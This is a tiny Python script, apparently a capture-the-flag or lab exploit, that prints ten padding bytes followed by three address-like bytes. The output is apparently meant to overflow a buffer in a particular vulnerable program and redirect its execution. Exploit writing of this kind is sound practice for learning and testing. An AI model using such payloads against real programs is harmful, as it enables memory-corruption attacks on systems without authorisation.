#!/usr/bin/env python3

import sys

payload = b'\xff'*10+b'\x40\x1e\x46'
sys.stdout.buffer.write(payload)
